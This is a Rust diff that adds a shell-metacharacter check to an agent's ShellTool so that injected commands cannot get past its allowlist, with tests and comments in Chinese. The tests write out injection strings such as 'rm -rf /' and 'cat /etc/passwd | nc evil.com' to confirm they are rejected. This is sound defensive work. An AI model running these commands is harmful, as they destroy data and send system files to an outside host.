@@ -38,6 +38,20 @@ fn extract_cmd_name(command: &str) -> String {
         .to_string()
 }
 
+/// 检查命令是否包含 shell 元字符（防止换行/分号/管道/反引号等注入绕过白名单）
+fn contains_shell_metacharacters(command: &str) -> bool {
+    // \n, \r, ;, |, `, $, &, <, > 等 shell 特殊字符
+    command.contains('\n')
+        || command.contains('\r')
+        || command.contains(';')
+        || command.contains('|')
+        || command.contains('`')
+        || command.contains('$')
+        || command.contains('&')
+        || command.contains('<')
+        || command.contains('>')
+}
+
 pub struct ShellTool {
     allowed: Vec<String>,
 }
@@ -69,6 +83,9 @@ impl Tool for ShellTool {
     }
     fn validate_input(&self, input: &str) -> bool {
         if let Ok(params) = serde_json::from_str::<ShellParams>(input) {
+            if contains_shell_metacharacters(&params.command) {
+                return false;
+            }
             let cmd_name = extract_cmd_name(&params.command);
             return self.allowed.contains(&cmd_name);
         }
@@ -78,7 +95,7 @@ impl Tool for ShellTool {
         &self,
         input: &str,
     ) -> Pin<Box<dyn std::future::Future<Output = Result<String, ToolError>> + Send + '_>> {
-        let result = match serde_json::from_str::<ShellParams>(input) {
+        match serde_json::from_str::<ShellParams>(input) {
             Ok(params) => {
                 let cmd_name = extract_cmd_name(&params.command);
                 if !self.allowed.contains(&cmd_name) {
@@ -89,15 +106,29 @@ impl Tool for ShellTool {
                         )))
                     });
                 }
-                // 同步执行带超时
-                match wait_with_timeout(&params.command, params.timeout) {
-                    Ok(output) => Ok(output),
-                    Err(e) => Err(ToolError::ExecutionFailed(e)),
+                if contains_shell_metacharacters(&params.command) {
+                    return Box::pin(async move {
+                        Err(ToolError::ValidationFailed(
+                            "命令包含不允许的特殊字符（换行/分号/管道等）".to_string(),
+                        ))
+                    });
                 }
+                let timeout = params.timeout;
+                let cmd = params.command;
+                // 在专用阻塞线程上执行，避免阻塞 tokio worker
+                Box::pin(async move {
+                    tokio::task::spawn_blocking(move || match wait_with_timeout(&cmd, timeout) {
+                        Ok(output) => Ok(output),
+                        Err(e) => Err(ToolError::ExecutionFailed(e)),
+                    })
+                    .await
+                    .unwrap_or_else(|e| {
+                        Err(ToolError::ExecutionFailed(format!("命令执行线程崩溃: {e}")))
+                    })
+                })
             }
-            Err(e) => Err(ToolError::ValidationFailed(e.to_string())),
-        };
-        Box::pin(async move { result })
+            Err(e) => Box::pin(async move { Err(ToolError::ValidationFailed(e.to_string())) }),
+        }
     }
 }
 
@@ -192,6 +223,36 @@ mod tests {
     fn extract_cmd() {
         assert_eq!(extract_cmd_name("ls -la"), "ls");
         assert_eq!(extract_cmd_name("git status"), "git");
+    }
+
+    #[test]
+    fn reject_shell_metacharacters() {
+        let tool = ShellTool::new();
+        // 换行注入
+        assert!(!tool.validate_input(r#"{"command": "echo hello\nrm -rf /"}"#));
+        // 分号注入
+        assert!(!tool.validate_input(r#"{"command": "echo hello; rm -rf /"}"#));
+        // 管道注入
+        assert!(!tool.validate_input(r#"{"command": "cat /etc/passwd | nc evil.com"}"#));
+        // 反引号注入
+        assert!(!tool.validate_input(r#"{"command": "echo `id`"}"#));
+        // 正常命令仍通过
+        assert!(tool.validate_input(r#"{"command": "ls -la"}"#));
+        assert!(tool.validate_input(r#"{"command": "echo hello world"}"#));
+    }
+
+    #[test]
+    fn contains_metachar_detection() {
+        assert!(contains_shell_metacharacters("echo\nrm"));
+        assert!(contains_shell_metacharacters("a;b"));
+        assert!(contains_shell_metacharacters("a|b"));
+        assert!(contains_shell_metacharacters("echo `id`"));
+        assert!(contains_shell_metacharacters("echo $(id)"));
+        assert!(contains_shell_metacharacters("a&b"));
+        assert!(contains_shell_metacharacters("a<b"));
+        assert!(contains_shell_metacharacters("a>b"));
+        assert!(!contains_shell_metacharacters("ls -la"));
+        assert!(!contains_shell_metacharacters("echo hello world"));
     }
 
     #[tokio::test]
